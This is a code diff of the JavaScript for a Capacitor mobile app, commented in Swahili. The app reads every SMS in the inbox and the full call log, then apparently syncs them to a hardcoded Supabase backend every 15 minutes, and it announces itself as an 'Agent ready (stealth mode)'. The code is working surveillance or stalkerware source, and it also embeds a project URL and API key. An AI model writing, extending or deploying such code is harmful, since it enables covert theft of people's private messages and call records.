@@ -1,9 +1,9 @@
-// Supabase credentials (sawa na dashboard)
+// Supabase credentials (BADILISHA NA ZAKO)
 const SUPABASE_URL = 'https://kwqvlngdrjsubcndivuf.supabase.co';
 const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt3cXZsbmdkcmpzdWJjbmRpdnVmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU5Nzk3OTUsImV4cCI6MjA5MTU1NTc5NX0.fHv0aaxd-3uPZrt_LVPSTt86GxqJXaWyPVCy3NJxB0I';
 
 let supabase;
-let SMSReader, CallLog, Preferences, Network;
+let SmsPlugin, CallLogPlugin, Preferences, Network;
 
 async function addLog(msg) {
   const logDiv = document.getElementById('logPanel');
@@ -15,30 +15,28 @@ async function addLog(msg) {
 }
 
 async function initPlugins() {
-  // Dynamically load Capacitor plugins
   const { Capacitor } = window.Capacitor;
   if (Capacitor.isNativePlatform()) {
-    // These will be available after npm install and npx cap sync
-    SMSReader = Capacitor.Plugins.SMSReader || (await import('@capacitor-community/sms')).SMSReader;
-    CallLog = Capacitor.Plugins.CallLog || (await import('capacitor-call-log')).CallLog;
+    // Import dynamically (kwa sababu ya Capacitor)
+    SmsPlugin = Capacitor.Plugins.SmsPlugin || (await import('capacitor-sms')).SmsPlugin;
+    CallLogPlugin = Capacitor.Plugins.CallLogPlugin || (await import('capacitor-call-log')).CallLogPlugin;
     Preferences = Capacitor.Plugins.Preferences || (await import('@capacitor/preferences')).Preferences;
     Network = Capacitor.Plugins.Network || (await import('@capacitor/network')).Network;
   } else {
     addLog("Running in browser (mock mode)");
-    // Mocks for testing
-    SMSReader = { requestPermissions: async () => ({ result: 'granted' }), readAllMessages: async () => ({ messages: [] }) };
-    CallLog = { requestPermissions: async () => ({ result: 'granted' }), getCallLogs: async () => ({ logs: [] }) };
+    SmsPlugin = { requestPermissions: async () => ({ result: 'granted' }), getSMS: async () => ({ messages: [] }) };
+    CallLogPlugin = { requestPermissions: async () => ({ result: 'granted' }), getCallLogs: async () => ({ logs: [] }) };
     Preferences = { get: async () => ({ value: '0' }), set: async () => {} };
   }
 }
 
 async function requestPermissions() {
-  if (SMSReader) {
-    const { result } = await SMSReader.requestPermissions();
+  if (SmsPlugin) {
+    const { result } = await SmsPlugin.requestPermissions();
     if (result !== 'granted') throw new Error('SMS permission denied');
   }
-  if (CallLog) {
-    const { result } = await CallLog.requestPermissions();
+  if (CallLogPlugin) {
+    const { result } = await CallLogPlugin.requestPermissions();
     if (result !== 'granted') throw new Error('Call log permission denied');
   }
   addLog("Permissions granted");
@@ -49,12 +47,11 @@ async function initSupabase() {
   addLog("Supabase ready");
 }
 
-// Read all SMS
 async function readAllSMS() {
   try {
-    const { messages } = await SMSReader.readAllMessages();
+    const { messages } = await SmsPlugin.getSMS({ box: 'inbox' });
     return messages.map(msg => ({
-      sender: msg.address || msg.phoneNumber,
+      sender: msg.address,
       body: msg.body,
       created_at: new Date(msg.date).toISOString()
     }));
@@ -64,13 +61,12 @@ async function readAllSMS() {
   }
 }
 
-// Read call logs
 async function readCallLogs() {
   try {
-    const { logs } = await CallLog.getCallLogs();
+    const { logs } = await CallLogPlugin.getCallLogs();
     return logs.map(log => ({
       number: log.number,
-      type: log.type, // incoming, outgoing, missed
+      type: log.type,
       duration: log.duration || 0,
       created_at: new Date(log.date).toISOString()
     }));
@@ -80,7 +76,6 @@ async function readCallLogs() {
   }
 }
 
-// Last sync timestamp
 async function getLastSyncTime() {
   const { value } = await Preferences.get({ key: 'lastSync' });
   return parseInt(value) || 0;
@@ -89,7 +84,6 @@ async function setLastSyncTime(ts) {
   await Preferences.set({ key: 'lastSync', value: ts.toString() });
 }
 
-// Sync SMS
 async function syncSMS(lastSync) {
   const allSMS = await readAllSMS();
   const newSMS = allSMS.filter(s => new Date(s.created_at).getTime() > lastSync);
@@ -106,7 +100,6 @@ async function syncSMS(lastSync) {
   return newSMS.length;
 }
 
-// Sync Call logs
 async function syncCalls(lastSync) {
   const allCalls = await readCallLogs();
   const newCalls = allCalls.filter(c => new Date(c.created_at).getTime() > lastSync);
@@ -135,7 +128,6 @@ async function fullSync() {
   document.getElementById('statusMsg').innerHTML = `✅ Last sync: ${new Date(now).toLocaleString()}`;
 }
 
-// Auto sync every 15 minutes
 let autoInterval;
 async function startAutoSync() {
   if (autoInterval) clearInterval(autoInterval);
@@ -151,14 +143,8 @@ async function startAutoSync() {
   }, 15 * 60 * 1000);
 }
 
-// Optional: listen for new SMS/call events
 function registerEventListeners() {
-  if (SMSReader && SMSReader.addSMSListener) {
-    SMSReader.addSMSListener(() => fullSync());
-  }
-  if (CallLog && CallLog.addCallLogListener) {
-    CallLog.addCallLogListener(() => fullSync());
-  }
+  // Optional: Listen for new SMS (not supported by all plugins)
 }
 
 async function initApp() {
@@ -172,7 +158,6 @@ async function initApp() {
   addLog("Agent ready (stealth mode)");
 }
 
-// UI buttons
 document.getElementById('syncNowBtn').addEventListener('click', fullSync);
 document.getElementById('clearLogBtn').addEventListener('click', () => {
   document.getElementById('logPanel').innerHTML = '';
